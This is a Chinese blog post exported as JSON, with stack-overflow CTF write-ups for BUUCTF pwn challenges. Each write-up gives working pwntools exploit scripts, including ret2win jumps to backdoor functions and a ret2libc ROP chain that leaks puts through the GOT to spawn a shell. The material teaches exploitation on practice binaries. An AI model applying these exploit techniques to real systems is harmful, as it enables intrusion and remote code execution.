{"title":"BUU pwn","uid":"9c4b020a9215e27197217b9ca10cd6d8","slug":"BUU-PWN","date":"2021-10-16T05:47:11.000Z","updated":"2021-11-06T02:18:11.159Z","comments":true,"path":"api/articles/BUU-PWN.json","keywords":null,"cover":"https://i.loli.net/2021/05/24/6ewQX9kiC7ZpuOd.jpg","content":"<h1 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h1><p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>\n<ul>\n<li>程序必须向栈上写入数据。</li>\n<li>写入的数据大小没有被良好地控制。</li>\n</ul>\n<h1 id=\"rip\"><a href=\"#rip\" class=\"headerlink\" title=\"rip\"></a>rip</h1><h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>首先查看附件，发现没开什么保护，丢进IDA里面看一下</p>\n<p><img src=\"https://i.loli.net/2021/05/23/vPpXGYRlquMrOWh.png\" alt=\"image.png\"></p>\n<p>发现可疑函数（fun），点进去可以发现函数调用了/bin/sh，接下来我们可以利用这个函数得到flag<img src=\"https://i.loli.net/2021/05/23/Gzj4Jyef3P9tLq2.png\" alt=\"image.png\"></p>\n<p>开始调试。首先创造一个长度为150的字符串，运行该附件，将那个字符串输入进去<img src=\"https://i.loli.net/2021/05/23/WvfGUnBq1NhFZjQ.png\" alt=\"image.png\"></p>\n<p>之后程序直接报错，因为return地址处不是一个正确的地址值，无法跳转。通过return的那个地址值，我们可以计算return距离输入点的长度。使用cyclic计算偏移量<img src=\"https://i.loli.net/2021/05/23/odKI89vOWRDAuEZ.png\" alt=\"image.png\"></p>\n<p>得到偏移量就可以写exp了</p>\n<h2 id=\"编写EXP\"><a href=\"#编写EXP\" class=\"headerlink\" title=\"编写EXP\"></a>编写EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">28652</span>)</span><br><span class=\"line\">fun = <span class=\"number\">0x401186</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">23</span>+p64(fun+<span class=\"number\">1</span>)  //平衡堆栈</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"warmup-csaw-2016\"><a href=\"#warmup-csaw-2016\" class=\"headerlink\" title=\"warmup_csaw_2016\"></a>warmup_csaw_2016</h1><h2 id=\"思路-1\"><a href=\"#思路-1\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>也是一个简单的栈溢出，思路还是一样的，先查看保护，还是什么保护都没有开<img src=\"https://i.loli.net/2021/05/24/rCDanMEpmvbN28R.png\" alt=\"image.png\"></p>\n<p>丢进IDA查看，就是输出两个语句和一个函数地址，查看函数，发现是打开flag文件。思路立刻就有了，因为是gets函数没有限制输入，所以可以通过栈溢出来获得flag。所以，接下来要计算偏移量<img src=\"https://i.loli.net/2021/05/24/bA1kDTgImdNEpc2.png\" alt=\"image.png\"></p>\n<p>还是和上面一题一样的方法计算偏移量</p>\n<p><img src=\"https://i.loli.net/2021/05/24/1oBRpDXmTdVPvru.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p=remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">26972</span>)</span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x40</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">8</span>+p64(<span class=\"number\">0x40060D</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ciscn-2019-n-1\"><a href=\"#ciscn-2019-n-1\" class=\"headerlink\" title=\"ciscn_2019_n_1\"></a>ciscn_2019_n_1</h1><h2 id=\"思路-2\"><a href=\"#思路-2\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>检查开了什么保护，发现只开了NX，其它没有开，也就是数据段不可执行<img src=\"https://i.loli.net/2021/05/25/smzhw5ZEVCYNP4W.png\" alt=\"image.png\"></p>\n<p>扔进IDA查看，也就是调用了func函数，点进func函数，函数先是将用户输入的值赋予给v1，之后判断v2是否等于11.28125，如果等于就可以得到flag，所以思路就是计算v1和v2相差多少，再利用gets函数将v2覆盖为11.28125<img src=\"https://i.loli.net/2021/05/25/wFnCVTSrxtgHf2i.png\" alt=\"image.png\"></p>\n<p><img src=\"https://i.loli.net/2021/05/25/nxwgLFy6OBIJueS.png\" alt=\"image.png\"></p>\n<p>因为11.28125在内存中是以十六进制存储，所以要将11.28125转成十六进制</p>\n<h3 id=\"EXP-1\"><a href=\"#EXP-1\" class=\"headerlink\" title=\"EXP\"></a>EXP</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node3.buuoj.cn&#x27;</span>,<span class=\"number\">25675</span>)</span><br><span class=\"line\">payload = ‘a<span class=\"string\">&#x27; *(0x30-0x4) + p64(0x41348000)</span></span><br><span class=\"line\"><span class=\"string\">p.sendline(payload)</span></span><br><span class=\"line\"><span class=\"string\">p.interactive()</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"pwn1-sctf-2016\"><a href=\"#pwn1-sctf-2016\" class=\"headerlink\" title=\"pwn1_sctf_2016\"></a>pwn1_sctf_2016</h1><p>进入IDA发现存在后门函数和fgets函数，不过fgets函数限制了长度，这个长度无法造成溢出。但是在后面发现std::string::string函数，虽然不知道是干什么的但是根据名称猜测可能是由某字符串转变成另一字符串</p>\n<p><img src=\"https://i.loli.net/2021/10/18/JxoN8SInPAMjXil.png\" alt=\"屏幕截图 2021-10-18 200913.png\"></p>\n<p>进入gdb调试，发现输入的I经过std::string::string函数会转变成you，换句话说也就是1和字符转成3个字符，而要造成栈溢出需要0x3c如果通过转化可以达到要求，也就是需要20个’I’</p>\n<p><img src=\"https://i.loli.net/2021/10/18/CcGNzTIEBi6pae2.png\" alt=\"屏幕截图 2021-10-18 201902.png\"></p>\n<p>之后就很简单了，通过转换造成栈溢出，跳转到后门函数获取shell</p>\n<h2 id=\"EXP-2\"><a href=\"#EXP-2\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./pwn1_sctf_2016&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26513</span>)</span><br><span class=\"line\">get_shell = <span class=\"number\">0x8048F13</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;I&#x27;</span>*<span class=\"number\">20</span>+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>+p32(get_shell)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://i.loli.net/2021/10/18/PKQuUJaveh5cE8n.png\" alt=\"image.png\"></p>\n<h1 id=\"jarvisoj-level0\"><a href=\"#jarvisoj-level0\" class=\"headerlink\" title=\"jarvisoj_level0\"></a>jarvisoj_level0</h1><p>简单的栈溢出，直接上exp</p>\n<h2 id=\"EXP-3\"><a href=\"#EXP-3\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./level0&#x27;</span>)</span><br><span class=\"line\">get_shell = <span class=\"number\">0x40059A</span></span><br><span class=\"line\">payload1 = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x88</span>+p64(get_shell)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ciscn-2019-c-1\"><a href=\"#ciscn-2019-c-1\" class=\"headerlink\" title=\"ciscn_2019_c_1\"></a>ciscn_2019_c_1</h1><p>使用IDA打开，在加密函数中存在危险函数gets，可以造成栈溢出。因为没有system以及bin/sh字符串，所以采取libc泄露来做此题</p>\n<p><img src=\"https://i.loli.net/2021/10/18/dpC6UmnwKf4E7Il.png\" alt=\"屏幕截图 2021-10-18 193913.png\"></p>\n<p>所以基本思路就是运行两次，先泄露函数地址获得libc，计算得到system函数和bin/sh字符串地址，第二次运行执行system函数获得shell</p>\n<p>payload1:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload1=<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">88</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br></pre></td></tr></table></figure>\n\n<p>payload2:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload2=<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">88</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br></pre></td></tr></table></figure>\n\n<p>p64(ret_addr)：目的是让堆栈对齐</p>\n<h1 id=\"EXP-4\"><a href=\"#EXP-4\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">context.arch = <span class=\"string\">&#x27;amd64&#x27;</span></span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;node4.buuoj.cn&#x27;,25488)</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class=\"line\">puts_plt=elf.plt[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">puts_got=elf.got[<span class=\"string\">&quot;puts&quot;</span>]</span><br><span class=\"line\">start_addr=elf.symbols[<span class=\"string\">&quot;_start&quot;</span>]</span><br><span class=\"line\">pop_rdi_addr=<span class=\"number\">0x400c83</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your choice!\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your Plaintext to be encrypted\\n&quot;</span>)</span><br><span class=\"line\">payload1=<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">88</span>+p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(start_addr)</span><br><span class=\"line\">p.sendline(payload1)</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b  main&#x27;)</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Ciphertext\\n&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">puts_addr=u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">p.info(<span class=\"string\">&#x27;puts_addr==&gt;%#x&#x27;</span>,puts_addr)</span><br><span class=\"line\">libc=LibcSearcher(<span class=\"string\">&quot;puts&quot;</span>,puts_addr)</span><br><span class=\"line\">libcbase=puts_addr-libc.dump(<span class=\"string\">&quot;puts&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span> libcbase</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p,&#x27;b  main&#x27;)</span></span><br><span class=\"line\">system_addr=libcbase+libc.dump(<span class=\"string\">&quot;system&quot;</span>)</span><br><span class=\"line\">binsh_addr=libcbase+libc.dump(<span class=\"string\">&quot;str_bin_sh&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your choice!\\n&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">&quot;1&quot;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Input your Plaintext to be encrypted\\n&quot;</span>)</span><br><span class=\"line\">ret_addr=<span class=\"number\">0x4006b9</span></span><br><span class=\"line\">payload2=<span class=\"string\">&quot;A&quot;</span>*<span class=\"number\">88</span>+p64(ret_addr)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"ciscn-2019-n-8\"><a href=\"#ciscn-2019-n-8\" class=\"headerlink\" title=\"ciscn_2019_n_8\"></a>ciscn_2019_n_8</h1><p>32位程序，有一个输入，之后判断var[13]是否等于17，如果等于17就执行system函数，而我们的输入会存储到var中，所以只要我们输入到var[13]时的值为17就可以</p>\n<p><img src=\"https://i.loli.net/2021/10/25/sn18qJwGASbNoEx.png\" alt=\"image.png\"></p>\n<h2 id=\"EXP-5\"><a href=\"#EXP-5\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">27044</span>)</span><br><span class=\"line\">payload = p32(<span class=\"number\">0</span>)*<span class=\"number\">13</span>+p32(<span class=\"number\">17</span>)</span><br><span class=\"line\">p.sendlineafter(<span class=\"string\">&quot;What&#x27;s your name?&quot;</span>,payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"not-the-same-3dsctf-2016\"><a href=\"#not-the-same-3dsctf-2016\" class=\"headerlink\" title=\"not_the_same_3dsctf_2016\"></a>not_the_same_3dsctf_2016</h1><p>查看反汇编代码，很明显存在栈溢出，同时还存在后门函数，这个函数会读取flag.txt文件到fl4g地址。<img src=\"https://i.loli.net/2021/10/25/iJzlBGpfet5ubDr.png\" alt=\"image.png\"></p>\n<p>不仅如此，程序还存在write函数<img src=\"https://i.loli.net/2021/10/25/lrVEjdo7vGH4UYR.png\" alt=\"image.png\"></p>\n<p>所以思路就是通过栈溢出跳转到后门函数之后执行write函数泄露对应地址的flag</p>\n<h2 id=\"EXP-6\"><a href=\"#EXP-6\" class=\"headerlink\" title=\"EXP\"></a>EXP</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#p = process(&#x27;./not_the_same_3dsctf_2016&#x27;)</span></span><br><span class=\"line\">p = remote(<span class=\"string\">&#x27;node4.buuoj.cn&#x27;</span>,<span class=\"number\">26667</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&#x27;not_the_same_3dsctf_2016&#x27;</span>)</span><br><span class=\"line\">flag = <span class=\"number\">0x80ECA2D</span></span><br><span class=\"line\">get_flag = <span class=\"number\">0x80489A0</span></span><br><span class=\"line\">write_addr = <span class=\"number\">0x806E270</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">45</span>+p32(get_flag)+p32(write_addr)+<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">4</span>+p32(<span class=\"number\">1</span>)+p32(flag)+p32(<span class=\"number\">45</span>)</span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n\n","text":"原理栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不...","link":"","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%90%86\"><span class=\"toc-text\">原理</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#rip\"><span class=\"toc-text\">rip</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E7%BC%96%E5%86%99EXP\"><span class=\"toc-text\">编写EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#warmup-csaw-2016\"><span class=\"toc-text\">warmup_csaw_2016</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-1\"><span class=\"toc-text\">思路</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ciscn-2019-n-1\"><span class=\"toc-text\">ciscn_2019_n_1</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%80%9D%E8%B7%AF-2\"><span class=\"toc-text\">思路</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#EXP-1\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#pwn1-sctf-2016\"><span class=\"toc-text\">pwn1_sctf_2016</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-2\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#jarvisoj-level0\"><span class=\"toc-text\">jarvisoj_level0</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-3\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ciscn-2019-c-1\"><span class=\"toc-text\">ciscn_2019_c_1</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#EXP-4\"><span class=\"toc-text\">EXP</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#ciscn-2019-n-8\"><span class=\"toc-text\">ciscn_2019_n_8</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-5\"><span class=\"toc-text\">EXP</span></a></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#not-the-same-3dsctf-2016\"><span class=\"toc-text\">not_the_same_3dsctf_2016</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#EXP-6\"><span class=\"toc-text\">EXP</span></a></li></ol></li></ol>","author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Bugku misc","uid":"baaff0bca7d1361050d55356188b2514","slug":"bugku misc","date":"2021-10-16T13:24:11.000Z","updated":"2021-11-06T02:21:13.337Z","comments":true,"path":"api/articles/bugku misc.json","keywords":null,"cover":"https://i.loli.net/2021/05/06/nlZVfDTitYMJb6R.jpg","text":"BUGKU misc部分1 这是一张单纯的图片先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样， 直接丢winhex，拖至最底，发现是unicode加密 发现是unicode加密，直接解码成ASCII，得到flag 2 隐写看到题目就知道是图片隐写，对图...","link":"","photos":[],"count_time":{"symbolsCount":"1.5k","symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}},"next_post":{"title":"BUU misc","uid":"794e58abd4973dfacdc6d660b3849142","slug":"BUU-MISC","date":"2021-10-16T00:48:04.000Z","updated":"2021-11-06T02:18:19.581Z","comments":true,"path":"api/articles/BUU-MISC.json","keywords":null,"cover":"https://i.loli.net/2021/06/06/eXnPUrYdWb3qpIN.jpg","text":"金三胖下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag 二维码在线扫码，得到secret is here 用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件 利用binwalk...","link":"","photos":[],"count_time":{"symbolsCount":980,"symbolsTime":"1 mins."},"categories":[{"name":"刷题","slug":"刷题","count":6,"path":"api/categories/刷题.json"}],"tags":[{"name":"misc","slug":"misc","count":3,"path":"api/tags/misc.json"}],"author":{"name":"Krito","slug":"blog-author","avatar":"https://i.loli.net/2021/05/05/GFiJQZM1pxK3AyC.jpg","link":"/","description":"不要等待，时机永远不会恰到好处。","socials":{"github":"https://github.com/Eli0t-g","twitter":"https://twitter.com/home","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/people/wu-sheng-85-17-66","csdn":"https://blog.csdn.net/qq_52053150?spm=1000.2115.3001.5343","juejin":"","customs":{}}}}}